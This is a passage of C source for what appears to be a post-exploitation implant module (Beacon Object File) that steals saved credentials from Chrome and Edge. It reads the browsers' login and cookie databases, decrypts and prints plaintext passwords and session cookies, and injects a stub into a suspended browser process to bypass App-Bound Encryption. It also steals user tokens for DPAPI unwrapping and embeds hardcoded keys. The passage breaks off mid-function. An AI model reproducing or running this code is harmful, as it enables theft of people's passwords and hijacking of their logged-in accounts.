                    !kw_ieq(tok, tl, "constraint") && !kw_ieq(tok, tl, "key")) {
                    char f = tok[0];
                    if ((f >= 'a' && f <= 'z') || (f >= 'A' && f <= 'Z') || f == '_') {
                        MSVCRT$memcpy(names[n], tok, tl + 1); n++;
                    }
                }
            }
            seg = p + 1;
        }
    }
    return n;
}

/* case-insensitive name lookup against a parsed column list. */
static int col_idx(char names[][40], int n, const char *want) {
    int i;
    for (i = 0; i < n; i++) {
        const char *a = names[i], *b = want;
        int eq = 1;
        while (*a && *b) {
            char ca = *a, cb = *b;
            if (ca >= 'A' && ca <= 'Z') ca = (char)(ca + 32);
            if (cb >= 'A' && cb <= 'Z') cb = (char)(cb + 32);
            if (ca != cb) { eq = 0; break; }
            a++; b++;
        }
        if (eq && *a == 0 && *b == 0) return i;
    }
    return -1;
}

/* find a table, parse its schema, and resolve up to three named columns to
 * physical indices. Returns 1 if the table was found (root stored in *rootOut;
 * missing columns yield -1). sql is heap-allocated internally to keep this
 * function's stack frame small (avoid ___chkstk_ms, LESSONS U4). */
typedef struct { int i0, i1, i2; } ColMap;
static int sqlite_map_cols(unsigned char *db, DWORD dbLen, const char *table,
                           const char *w0, const char *w1, const char *w2,
                           DWORD *rootOut, ColMap *m) {
    char *sql;
    char cn[32][40];
    int n;
    m->i0 = m->i1 = m->i2 = -1;
    *rootOut = 0;
    sql = (char *)intAlloc(4096);
    if (!sql) return 0;
    *rootOut = sqlite_find_table(db, dbLen, table, sql, 4096);
    if (!*rootOut) { intFree(sql); return 0; }
    n = parse_create_cols(sql, (int)MSVCRT$strlen(sql), cn, 32);
    m->i0 = col_idx(cn, n, w0);
    m->i1 = col_idx(cn, n, w1);
    m->i2 = col_idx(cn, n, w2);
    intFree(sql);
    return 1;
}

/* schema_cb: capture rootpage where type=="table" && name==tableName. Must be
 * non-static so the extern decl in sqlite_find_table resolves (single TU). */
void schema_cb(Col *cols, int ncol, void *ctx) {
    SchemaCtx *fc = (SchemaCtx *)ctx;
    char nm[64];
    if (fc->done || ncol < 5 || !cols[0].isText || !cols[1].isText) return;
    if (cols[0].len != 5 || MSVCRT$memcmp(cols[0].ptr, "table", 5) != 0) return;
    cstrncpy(nm, (const char *)cols[1].ptr, cols[1].len, sizeof(nm));
    if (MSVCRT$strcmp(nm, fc->name) != 0) return;
    fc->root = (DWORD)cols[3].ival;
    fc->done = 1;
    /* copy the CREATE TABLE sql (col4) so the caller can resolve column names
     * to physical indices — we walk the b-tree by position, not via SQL. */
    if (fc->sqlOut && fc->sqlCap > 0 && cols[4].isText) {
        cstrncpy(fc->sqlOut, (const char *)cols[4].ptr, cols[4].len, fc->sqlCap);
    }
}

/* ----------------------------------------------------------------------
 *  Chromium cleartext path
 * -------------------------------------------------------------------- */
typedef struct {
    unsigned char *keys[MAX_CAND_KEYS];  /* 32-byte candidate keys (heap-owned by caller of cb) */
    int nKeys;
    const char *browser;
    int count;        /* login rows with a password blob */
    int decrypted;    /* login rows successfully decrypted */
    int ccount;       /* cookie rows with an encrypted_value blob */
    int cdecrypted;   /* cookie rows successfully decrypted */
    /* resolved physical column indices for the table currently being walked
     * (set by the caller from the parsed CREATE TABLE schema; -1 = absent). */
    int iOrigin, iUser, iPass;           /* logins: origin_url, username_value, password_value */
    int iHost, iCName, iEnc;             /* cookies: host_key, name, encrypted_value */
} CrCtx;

/* decrypt one password_value blob with whichever candidate key verifies the
 * GCM tag. The tag is a perfect oracle: only the correct key yields
 * STATUS_SUCCESS, so we accept strictly on `ok` (never on a printable guess,
 * which would false-positive on wrong-key GCM-CTR garbage). Prints the triple. */
static void decrypt_and_print(CrCtx *cx, const char *url, int urlLen, const char *user, int userLen, const unsigned char *pw, int pwLen) {
    char ubuf[512], urlbuf[1024];
    int k;

    cstrncpy(urlbuf, url, urlLen, sizeof(urlbuf));
    cstrncpy(ubuf, user, userLen, sizeof(ubuf));

    if (pwLen < 15) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] %s | %s | <no encrypted blob>", urlbuf, ubuf);
        return;
    }
    if (pwLen >= 3 && MSVCRT$memcmp(pw, "v10", 3) == 0) {
        /* fallthrough to GCM-oracle below */
    } else if (pwLen >= 3 && MSVCRT$memcmp(pw, "v20", 3) == 0) {
        /* fallthrough */
    } else {
        /* some entries store plaintext (no v10/v20 prefix) — print as-is */
        char pb[256];
        cstrncpy(pb, (const char *)pw, pwLen, sizeof(pb));
        BeaconPrintf(CALLBACK_OUTPUT, "[~] %s | %s | %s (no v10/v20 prefix)", urlbuf, ubuf, pb);
        return;
    }

    if (pwLen < 15 + 16) { BeaconPrintf(CALLBACK_OUTPUT, "[-] %s | %s | <blob too short>", urlbuf, ubuf); return; }
    {
        const unsigned char *nonce = pw + 3;
        const unsigned char *ct = pw + 15;
        DWORD ctLen = pwLen - 15 - 16;
        const unsigned char *tag = pw + pwLen - 16;
        unsigned char *plain = NULL;
        DWORD outLen = 0;

        for (k = 0; k < cx->nKeys; k++) {
            BOOL ok = FALSE;
            plain = AesGcmDecrypt(cx->keys[k], nonce, ct, ctLen, tag, &outLen, &ok, 0);
            if (plain && ok) {
                char pb[1024];
                int m = (outLen < (int)sizeof(pb) - 1) ? (int)outLen : (int)sizeof(pb) - 1;
                int i;
                for (i = 0; i < m; i++) pb[i] = (char)plain[i];
                pb[m] = 0;
                BeaconPrintf(CALLBACK_OUTPUT, "[+] %s | %s | %s", urlbuf, ubuf, pb);
                cx->decrypted++;
                intFree(plain);
                return;
            }
            intFree(plain);
            plain = NULL;
        }
        if (plain) { intFree(plain); plain = NULL; }
        BeaconPrintf(CALLBACK_OUTPUT, "[!] %s | %s | <decrypt failed: no candidate key verified>", urlbuf, ubuf);
    }
}

static void logins_cb(Col *cols, int ncol, void *ctx) {
    CrCtx *cx = (CrCtx *)ctx;
    const char *url = NULL, *user = NULL;
    const unsigned char *pw = NULL;
    int urlLen = 0, userLen = 0, pwLen = 0;
    /* index by NAME (resolved from the schema), not by fixed position — the
     * logins table is origin_url, action_url, username_element, username_value,
     * password_element, password_value, ... so position 1/2 are NOT user/pass. */
    if (cx->iOrigin >= 0 && cx->iOrigin < ncol && cols[cx->iOrigin].isText) { url = (const char *)cols[cx->iOrigin].ptr; urlLen = cols[cx->iOrigin].len; }
    if (cx->iUser   >= 0 && cx->iUser   < ncol && cols[cx->iUser].isText)   { user = (const char *)cols[cx->iUser].ptr;   userLen = cols[cx->iUser].len; }
    if (cx->iPass   >= 0 && cx->iPass   < ncol && (cols[cx->iPass].isBlob || cols[cx->iPass].isText)) { pw = cols[cx->iPass].ptr; pwLen = cols[cx->iPass].len; }
    if (!pw || !pwLen) return;
    cx->count++;
    decrypt_and_print(cx, url, urlLen, user, userLen, pw, pwLen);
}

/* decrypt one cookie encrypted_value blob with the same candidate keys / GCM
 * oracle as passwords. Chrome cookies (v20 ABE) carry a 32-byte domain-binding
 * header after the AES-GCM plaintext that must be stripped (xaitax: if
 * decrypted->size() > 32, val = data+32). v10 (DPAPI-era) cookies have no such
 * header, so we only strip when the plaintext is longer than 32 bytes. Prints
 * host | name | value. */
static void decrypt_and_print_cookie(CrCtx *cx, const char *host, int hostLen, const char *name, int nameLen, const unsigned char *ev, int evLen) {
    char hbuf[256], nbuf[128];
    int k;

    cstrncpy(hbuf, host, hostLen, sizeof(hbuf));
    cstrncpy(nbuf, name, nameLen, sizeof(nbuf));

    if (evLen < 15) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] COOKIE %s | %s | <no encrypted blob>", hbuf, nbuf);
        return;
    }
    /* cookies use the same v10/v20 + nonce(12) + ct + tag(16) envelope. */
    if (evLen >= 3 && (MSVCRT$memcmp(ev, "v10", 3) == 0 || MSVCRT$memcmp(ev, "v20", 3) == 0)) {
        /* fallthrough to GCM oracle */
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[~] COOKIE %s | %s | <no v10/v20 prefix>", hbuf, nbuf);
        return;
    }
    if (evLen < 15 + 16) { BeaconPrintf(CALLBACK_OUTPUT, "[-] COOKIE %s | %s | <blob too short>", hbuf, nbuf); return; }
    {
        const unsigned char *nonce = ev + 3;
        const unsigned char *ct = ev + 15;
        DWORD ctLen = evLen - 15 - 16;
        const unsigned char *tag = ev + evLen - 16;
        unsigned char *plain = NULL;
        DWORD outLen = 0;

        for (k = 0; k < cx->nKeys; k++) {
            BOOL ok = FALSE;
            plain = AesGcmDecrypt(cx->keys[k], nonce, ct, ctLen, tag, &outLen, &ok, 0);
            if (plain && ok) {
                char pb[1024];
                /* strip the 32-byte cookie header when present (v20), else full */
                DWORD off = (outLen > 32) ? 32 : 0;
                DWORD m = outLen - off;
                int i;
                if (m > (int)sizeof(pb) - 1) m = (int)sizeof(pb) - 1;
                for (i = 0; i < (int)m; i++) pb[i] = (char)plain[off + i];
                pb[m] = 0;
                BeaconPrintf(CALLBACK_OUTPUT, "[+] COOKIE %s | %s | %s", hbuf, nbuf, pb);
                cx->cdecrypted++;
                intFree(plain);
                return;
            }
            intFree(plain);
            plain = NULL;
        }
        if (plain) { intFree(plain); plain = NULL; }
        BeaconPrintf(CALLBACK_OUTPUT, "[!] COOKIE %s | %s | <decrypt failed: no candidate key verified>", hbuf, nbuf);
    }
}

/* cookies table: index host_key / name / encrypted_value by NAME (the cookies
 * schema is creation_utc, host_key, top_frame_site_key, name, value, ...,
 * encrypted_value, ... so fixed positions 0/1/2 are NOT host/name/encrypted). */
static void cookies_cb(Col *cols, int ncol, void *ctx) {
    CrCtx *cx = (CrCtx *)ctx;
    const char *host = NULL, *name = NULL;
    const unsigned char *ev = NULL;
    int hostLen = 0, nameLen = 0, evLen = 0;
    if (cx->iHost  >= 0 && cx->iHost  < ncol && cols[cx->iHost].isText)  { host = (const char *)cols[cx->iHost].ptr;  hostLen = cols[cx->iHost].len; }
    if (cx->iCName >= 0 && cx->iCName < ncol && cols[cx->iCName].isText) { name = (const char *)cols[cx->iCName].ptr; nameLen = cols[cx->iCName].len; }
    if (cx->iEnc   >= 0 && cx->iEnc   < ncol && (cols[cx->iEnc].isBlob || cols[cx->iEnc].isText)) { ev = cols[cx->iEnc].ptr; evLen = cols[cx->iEnc].len; }
    if (!ev || !evLen) return;          /* many cookies have an empty encrypted_value */
    cx->ccount++;
    decrypt_and_print_cookie(cx, host, hostLen, name, nameLen, ev, evLen);
}

/* hardcoded keys for the new app-bound flag derivation (from decrypt.py).
 * flag 1: AES-GCM key (base64-decoded). flag 2: ChaCha20-Poly1305 key (hex). */
static const char *FLAG1_B64 = "sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=";
static const unsigned char FLAG2_KEY[32] = {
    0xE9,0x8F,0x37,0xD7,0xF4,0xE1,0xFA,0x43,0x3D,0x19,0x30,0x4D,0xC2,0x25,0x80,0x42,
    0x09,0x0E,0x2D,0x1D,0x7E,0xEA,0x76,0x70,0xD4,0x1F,0x73,0x8D,0x08,0x72,0x96,0x60 };
static const unsigned char FLAG3_XOR[32] = {
    0xCC,0xF8,0xA1,0xCE,0xC5,0x66,0x05,0xB8,0x51,0x75,0x52,0xBA,0x1A,0x2D,0x06,0x1C,
    0x03,0xA2,0x9E,0x90,0x27,0x4F,0xB2,0xFC,0xF5,0x9B,0xA4,0xB7,0x5C,0x39,0x23,0x90 };

static void xor32(const unsigned char *a, const unsigned char *b, unsigned char *out) {
    int i; for (i = 0; i < 32; i++) out[i] = a[i] ^ b[i];
}

/* add a 32-byte key candidate (copies into a heap buffer owned by CrCtx). */
static void add_key(CrCtx *cx, const unsigned char *k32) {
    unsigned char *c;
    if (cx->nKeys >= MAX_CAND_KEYS || !k32) return;
    c = (unsigned char *)intAlloc(32);
    if (!c) return;
    MSVCRT$memcpy(c, k32, 32);
    cx->keys[cx->nKeys++] = c;
}

/* Locate the browser's installed executable (wide path). Tries HKLM "App
 * Paths" first, then a few well-known Program Files roots. Returns 1 on
 * success. TUNE: chrome.exe/msedge.exe live directly in ...\Application\ (not
 * the version-numbered subdir), so the static fallback covers the common case
 * when App Paths is unavailable. */
static int FindBrowserExe(const char *browser, wchar_t *exeW, int exeWCap) {
    HKEY hKey = NULL; DWORD type = 0, len, cch; LONG r;
    const wchar_t *sub = (MSVCRT$strcmp(browser, "msedge") == 0)
        ? L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msedge.exe"
        : L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe";

    r = ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, sub, 0, KEY_READ, &hKey);
    if (r == 0) {
        len = (DWORD)(exeWCap * sizeof(wchar_t));
        r = ADVAPI32$RegQueryValueExW(hKey, NULL, NULL, &type, (LPBYTE)exeW, &len);
        ADVAPI32$RegCloseKey(hKey);
        if (r == 0 && (type == REG_SZ || type == REG_EXPAND_SZ) && len >= sizeof(wchar_t)) {
            cch = len / sizeof(wchar_t);
            if (cch >= (DWORD)exeWCap) cch = exeWCap - 1;
            exeW[cch] = 0;                 /* force NUL termination */
            return 1;
        }
    }
    {   /* fallback: well-known install roots */
        const wchar_t *cands[4]; int i, n = 0, j;
        if (MSVCRT$strcmp(browser, "msedge") == 0) {
            cands[n++] = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
            cands[n++] = L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe";
        } else {
            cands[n++] = L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
            cands[n++] = L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";
        }
        for (i = 0; i < n; i++) {
            if (KERNEL32$GetFileAttributesW(cands[i]) != INVALID_FILE_ATTRIBUTES) {
                for (j = 0; cands[i][j] && j < exeWCap - 1; j++) exeW[j] = cands[i][j];
                exeW[j] = 0;
                return 1;
            }
        }
    }
    return 0;
}

/* ABE PathValidation defeat: spawn a legit chrome.exe/msedge.exe
 * CREATE_SUSPENDED, inject the PIC stub + a StubData struct, CreateRemoteThread
 * at the stub (the original main thread is never resumed). The stub performs
 * ONLY the path-validated IElevator->DecryptData inside the browser process and
 * returns the raw output over a named pipe; we read it, then terminate the host.
 * encKey = app_bound_encrypted_key payload WITH the 4-byte APPB prefix already
 * stripped (caller did that). Returns the raw DecryptData output (heap) + len,
 * or NULL. TUNE: under SYSTEM, pass browserPid so chrome.exe is spawned as the
 * target user (impersonation); if the beacon already runs as the user, pid=0. */
static unsigned char *GetAppBoundKeyViaHollow(const char *browser,
        const unsigned char *encKey, DWORD encKeyLen,
        DWORD browserPid, DWORD *outLen) {
    wchar_t exeW[MAX_PATH];
    char pipeName[64];
    HANDLE hPipe = NULL, hEvent = NULL, hThread = NULL;
    OVERLAPPED ov;
    StubData *sd = NULL; StubResponse resp;   /* sd is ~2.2KB: heap, not stack (avoids ___chkstk_ms) */
    unsigned char *stubBase = NULL;
    SIZE_T stubLen = (SIZE_T)abe_stub_bin_len, total, wr = 0;
    STARTUPINFOW si; PROCESS_INFORMATION pi;
    BOOL imp = FALSE, ok; DWORD nread = 0, tick, wait, oldp = 0;
    unsigned char *keyBlob = NULL;
    int isChrome = (MSVCRT$strcmp(browser, "chrome") == 0);

    if (outLen) *outLen = 0;
    if (!isChrome && MSVCRT$strcmp(browser, "msedge") != 0) return NULL; /* Chromium-only */
    if (encKeyLen == 0 || encKeyLen > sizeof(((StubData *)0)->keyBytes)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] hollow: app-bound key blob length %lu out of range", (unsigned long)encKeyLen);
        return NULL;
    }
    if (!FindBrowserExe(browser, exeW, MAX_PATH)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] hollow: cannot locate %s.exe (App Paths / Program Files)", browser);
        return NULL;
    }

    tick = KERNEL32$GetTickCount();
    MSVCRT$_snprintf(pipeName, sizeof(pipeName), "\\\\.\\pipe\\axabe_%lu", (unsigned long)tick);

    hPipe = KERNEL32$CreateNamedPipeA(pipeName, PIPE_ACCESS_INBOUND | FILE_FLAG_OVERLAPPED,
                PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1u,
                sizeof(StubResponse), sizeof(StubResponse), 0, NULL);
    if (hPipe == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[!] hollow: CreateNamedPipeA err=%lu", KERNEL32$GetLastError());
        return NULL;
    }
    hEvent = KERNEL32$CreateEventA(NULL, TRUE, FALSE, NULL);
    if (!hEvent) { KERNEL32$CloseHandle(hPipe); return NULL; }

    /* fill StubData (heap-allocated: ~2.2KB, too large for the stack frame) */
    sd = (StubData *)intAlloc(sizeof(*sd));
    if (!sd) { BeaconPrintf(CALLBACK_ERROR, "[!] hollow: intAlloc StubData failed"); KERNEL32$CloseHandle(hPipe); KERNEL32$CloseHandle(hEvent); return NULL; }
    intZeroMemory(sd, sizeof(*sd));
    MSVCRT$memcpy(sd->clsid, isChrome ? (const void*)&Chrome_CLSID_Elevator : (const void*)&Edge_CLSID_Elevator, 16);
    if (isChrome) {
        MSVCRT$memcpy(sd->iid_v2, &Chrome_IID_IElevator2, 16);
        MSVCRT$memcpy(sd->iid_v1, &Chrome_IID_IElevator,  16);
        sd->vtIdx = 5; sd->tryV2First = 1;
    } else {
        MSVCRT$memcpy(sd->iid_v1, &Edge_IID_IElevator, 16);   /* Edge is v1-only; iid_v2 stays zero */
        sd->vtIdx = 8; sd->tryV2First = 0;
    }
    sd->keyLen = encKeyLen;
    MSVCRT$memcpy(sd->keyBytes, encKey, encKeyLen);
    { size_t pl = MSVCRT$strlen(pipeName); if (pl >= sizeof(sd->pipeName)) pl = sizeof(sd->pipeName) - 1;
      MSVCRT$memcpy(sd->pipeName, pipeName, pl); sd->pipeName[pl] = 0; }

    /* run the suspended browser as the target user when the beacon is SYSTEM */
    if (browserPid) { imp = StealAndImpersonate(browserPid);
        if (!imp) BeaconPrintf(CALLBACK_ERROR, "[!] hollow: impersonate pid %lu failed (beacon must be SYSTEM)", browserPid); }

    intZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    intZeroMemory(&pi, sizeof(pi));
    ok = KERNEL32$CreateProcessW(exeW, NULL, NULL, NULL, FALSE,
            CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (imp) ADVAPI32$RevertToSelf();
    if (!ok) {
        BeaconPrintf(CALLBACK_ERROR, "[!] hollow: CreateProcessW(%ls) err=%lu", exeW, KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hPipe); KERNEL32$CloseHandle(hEvent); intFree(sd); return NULL;
    }

    total = stubLen + sizeof(*sd);
    stubBase = (unsigned char *)KERNEL32$VirtualAllocEx(pi.hProcess, NULL, total, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!stubBase) { BeaconPrintf(CALLBACK_ERROR, "[!] hollow: VirtualAllocEx err=%lu", KERNEL32$GetLastError()); goto cleanup; }
    if (!KERNEL32$WriteProcessMemory(pi.hProcess, stubBase, abe_stub_bin, stubLen, &wr)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] hollow: write stub err=%lu", KERNEL32$GetLastError()); goto cleanup; }
    if (!KERNEL32$WriteProcessMemory(pi.hProcess, stubBase + stubLen, sd, sizeof(*sd), &wr)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] hollow: write stubdata err=%lu", KERNEL32$GetLastError()); goto cleanup; }
    if (!KERNEL32$VirtualProtectEx(pi.hProcess, stubBase, stubLen, PAGE_EXECUTE_READ, &oldp)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] hollow: VirtualProtectEx err=%lu", KERNEL32$GetLastError()); goto cleanup; }

    hThread = KERNEL32$CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)stubBase,
                                          (LPVOID)(stubBase + stubLen), 0, NULL);
    if (!hThread) { BeaconPrintf(CALLBACK_ERROR, "[!] hollow: CreateRemoteThread err=%lu", KERNEL32$GetLastError()); goto cleanup; }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] hollow: %ls spawned suspended, stub injected (waiting for key...)", exeW);

    /* overlapped connect, then overlapped read — both with a backstop so a
     * stub that never connects/crashes can't hang the beacon. */
    intZeroMemory(&ov, sizeof(ov)); ov.hEvent = hEvent;
    KERNEL32$ConnectNamedPipe(hPipe, &ov);
    if (KERNEL32$GetLastError() == ERROR_IO_PENDING) {
        wait = KERNEL32$WaitForSingleObject(hEvent, 20000);
        if (wait != WAIT_OBJECT_0) {
            BeaconPrintf(CALLBACK_ERROR, "[!] hollow: stub did not connect to pipe (timeout)"); goto cleanup;
        }
        KERNEL32$GetOverlappedResult(hPipe, &ov, &nread, FALSE);
    }
    /* issue the overlapped read (reuse the event) */
    intZeroMemory(&ov, sizeof(ov)); ov.hEvent = hEvent;
    if (KERNEL32$ReadFile(hPipe, &resp, sizeof(resp), &nread, &ov)) {
        /* completed synchronously */
    } else if (KERNEL32$GetLastError() == ERROR_IO_PENDING) {
        wait = KERNEL32$WaitForSingleObject(hEvent, 15000);
        if (wait != WAIT_OBJECT_0) {
            BeaconPrintf(CALLBACK_ERROR, "[!] hollow: pipe read timeout"); goto cleanup;
        }
        if (!KERNEL32$GetOverlappedResult(hPipe, &ov, &nread, FALSE) || nread == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[!] hollow: GetOverlappedResult failed"); goto cleanup;
        }
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] hollow: ReadFile err=%lu", KERNEL32$GetLastError()); goto cleanup;
    }

    if (nread >= sizeof(resp) && resp.magic == STUB_MAGIC) {
        if (resp.status == 0 && resp.keyLen > 0 && resp.keyLen <= sizeof(resp.keyBytes)) {
            keyBlob = (unsigned char *)intAlloc(resp.keyLen);
            if (keyBlob) { MSVCRT$memcpy(keyBlob, resp.keyBytes, resp.keyLen); *outLen = resp.keyLen;
                BeaconPrintf(CALLBACK_OUTPUT, "[+] hollow: key recovered (%lu bytes) via %ls", (unsigned long)resp.keyLen, exeW); }
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[!] hollow: stub status=%lu hr=0x%08X comErr=%lu keyLen=%lu",
                         (unsigned long)resp.status, (unsigned int)resp.hr, (unsigned long)resp.comErr, (unsigned long)resp.keyLen);
        }
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] hollow: bad pipe response (nread=%lu magic=0x%08X)", (unsigned long)nread, (unsigned)(nread >= sizeof(resp) ? resp.magic : 0));
    }

cleanup:
    if (hThread) { KERNEL32$WaitForSingleObject(hThread, 5000); KERNEL32$CloseHandle(hThread); }
    if (pi.hProcess) { KERNEL32$TerminateProcess(pi.hProcess, 0); KERNEL32$CloseHandle(pi.hProcess); }
    if (pi.hThread)  KERNEL32$CloseHandle(pi.hThread);
    if (hPipe)  KERNEL32$CloseHandle(hPipe);
    if (hEvent) KERNEL32$CloseHandle(hEvent);
    if (sd)    intFree(sd);
    return keyBlob;
}

/* Derive the v20 (app-bound) key blob from Local State's
 * app_bound_encrypted_key. Path H: spawn a suspended browser and let the
 * injected stub do the path-validated IElevator->DecryptData (defeats
 * PathValidation, which the in-beacon call below fails). Path A: in-beacon
 * IElevator COM (works only if the beacon already lives in the browser dir).
 * Path B: double-DPAPI (needs SYSTEM + browserPid to impersonate the user).
 * Returns the inner key blob (heap) and length, or NULL. */
static unsigned char *GetAppBoundKeyBlob(const char *localStatePath, const char *browser, DWORD browserPid, DWORD *outLen) {
    DWORD ls = 0, b64len = 0, klen = 0;
    char *lsbuf = NULL, *b64key = NULL;
    unsigned char *encKey = NULL, *keyBlob = NULL;
    const CLSID *clsid = NULL; const IID *iid = NULL;
    HRESULT hr;

    if (outLen) *outLen = 0;
    lsbuf = GetFileContent((char *)localStatePath, &ls);
    if (!lsbuf) { BeaconPrintf(CALLBACK_ERROR, "[!] cannot read Local State: %s", localStatePath); return NULL; }
    b64key = ExtractKey(lsbuf, "\"app_bound_encrypted_key\":\"", &klen);
    if (!b64key || !klen) { BeaconPrintf(CALLBACK_ERROR, "[!] no app_bound_encrypted_key in Local State"); intFree(lsbuf); return NULL; }
    { char tmp = b64key[klen]; b64key[klen] = 0; encKey = Base64Decode(b64key, &b64len); b64key[klen] = tmp; }
    intFree(lsbuf);
    if (!encKey || b64len < sizeof(kCryptAppBoundKeyPrefix) || MSVCRT$memcmp(encKey, kCryptAppBoundKeyPrefix, sizeof(kCryptAppBoundKeyPrefix)) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] app_bound_encrypted_key missing APPB prefix"); if (encKey) intFree(encKey); return NULL;
    }
    { DWORD off = sizeof(kCryptAppBoundKeyPrefix); unsigned char *stripped = (unsigned char *)intAlloc(b64len - off); if (!stripped) { intFree(encKey); return NULL; } MSVCRT$memcpy(stripped, encKey + off, b64len - off); intFree(encKey); encKey = stripped; b64len -= off; }

    /* --- path H: suspended-process injection (defeats PathValidation) --- */
    keyBlob = GetAppBoundKeyViaHollow(browser, encKey, b64len, browserPid, outLen);

    /* --- path A: IElevator COM (works as the user) --- */
    if (MSVCRT$strcmp(browser, "chrome") == 0) { clsid = &Chrome_CLSID_Elevator; iid = &Chrome_IID_IElevator2; }
    else if (MSVCRT$strcmp(browser, "msedge") == 0) { clsid = &Edge_CLSID_Elevator; iid = &Edge_IID_IElevator; }
    if (!keyBlob && clsid) {
        hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
        if (FAILED(hr)) hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
        if (!FAILED(hr)) {
            void *elev = NULL;
            hr = OLE32$CoCreateInstance(clsid, NULL, CLSCTX_LOCAL_SERVER, iid, &elev);
            if (MSVCRT$strcmp(browser, "chrome") == 0 && FAILED(hr)) hr = OLE32$CoCreateInstance(clsid, NULL, CLSCTX_LOCAL_SERVER, &Chrome_IID_IElevator, &elev);
            if (!FAILED(hr) && elev) {
                BSTR ct = OLEAUT32$SysAllocStringByteLen((const char *)encKey, (UINT)b64len);
                BSTR pt = NULL; DWORD lerr = ERROR_GEN_FAILURE;
                OLE32$CoSetProxyBlanket((IUnknown *)elev, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_DYNAMIC_CLOAKING);
                if (MSVCRT$strcmp(browser, "chrome") == 0) hr = ((IElevatorChrome *)elev)->lpVtbl->DecryptData((IElevatorChrome *)elev, ct, &pt, &lerr);
                else hr = ((IElevatorEdge *)elev)->lpVtbl->DecryptData((IElevatorEdge *)elev, ct, &pt, &lerr);
                if (SUCCEEDED(hr) && pt) {
                    DWORD plen = OLEAUT32$SysStringByteLen(pt);
                    keyBlob = (unsigned char *)intAlloc(plen + 1);
                    if (keyBlob) { MSVCRT$memcpy(keyBlob, pt, plen); keyBlob[plen] = 0; *outLen = plen; }
                } else {
                    BeaconPrintf(CALLBACK_ERROR, "[!] IElevator DecryptData failed (hr=0x%08X lerr=%lu)", hr, lerr);
                }
                if (pt) OLEAUT32$SysFreeString(pt);
                OLEAUT32$SysFreeString(ct);
                ((IUnknown *)elev)->lpVtbl->Release((IUnknown *)elev);
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[!] CoCreateInstance IElevator failed (0x%08X) — need SYSTEM+pid fallback", hr);
            }
            OLE32$CoUninitialize();
        }
    }

    /* --- path B: double-DPAPI (needs SYSTEM + browserPid to impersonate user) --- */
    if (!keyBlob && browserPid) {
        DATA_BLOB in, mid, fin;
        BOOL r;
        in.pbData = encKey; in.cbData = b64len;
        r = CRYPT32$CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &mid);   /* layer 1: SYSTEM */
        if (r) {
            if (StealAndImpersonate(browserPid)) {
                r = CRYPT32$CryptUnprotectData(&mid, NULL, NULL, NULL, NULL, 0, &fin);  /* layer 2: user */
                ADVAPI32$RevertToSelf();
            } else { BeaconPrintf(CALLBACK_ERROR, "[!] impersonate pid %lu failed (need beacon SYSTEM)", browserPid); r = FALSE; }
            KERNEL32$LocalFree(mid.pbData);
            if (r) {
                /* blob = [validation_len(4)|validation|key_len(4)|key_blob] */
                DWORD cursor = 0, vlen, klen2;
                if (fin.cbData >= 8) {
                    vlen = *(DWORD *)(fin.pbData + cursor); cursor += 4;
                    cursor += vlen;
                    if (cursor + 4 <= fin.cbData) {
                        klen2 = *(DWORD *)(fin.pbData + cursor); cursor += 4;
                        if (cursor + klen2 <= fin.cbData) {
                            keyBlob = (unsigned char *)intAlloc(klen2 + 1);
                            if (keyBlob) { MSVCRT$memcpy(keyBlob, fin.pbData + cursor, klen2); keyBlob[klen2] = 0; *outLen = klen2; }
                        }
                    }
                }
                KERNEL32$LocalFree(fin.pbData);
            } else { BeaconPrintf(CALLBACK_ERROR, "[!] user-layer DPAPI failed"); }
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[!] SYSTEM-layer DPAPI failed (beacon must be SYSTEM for path B)");
        }
    }

    intFree(encKey);
    return keyBlob;
}

/* Build the candidate-key set for a Chromium browser.
 * localStatePath: "\\"-prefixed path under %LOCALAPPDATA% (or absolute).
 * browserPid: 0 if beacon runs as the user; a browser PID to impersonate if SYSTEM. */
static void BuildChromiumKeys(CrCtx *cx, const char *localStatePath, const char *browser, DWORD browserPid, int doV20) {
    DWORD ls = 0, klen = 0, b64len = 0;
    char *lsbuf = NULL, *b64key = NULL;
    unsigned char *v10key = NULL;
    unsigned char *keyBlob = NULL; DWORD keyBlobLen = 0;
    BOOL impersonating = FALSE;

    /* v10: DPAPI-unwrapped Local State encrypted_key */
    lsbuf = GetFileContent((char *)localStatePath, &ls);
    if (lsbuf) {
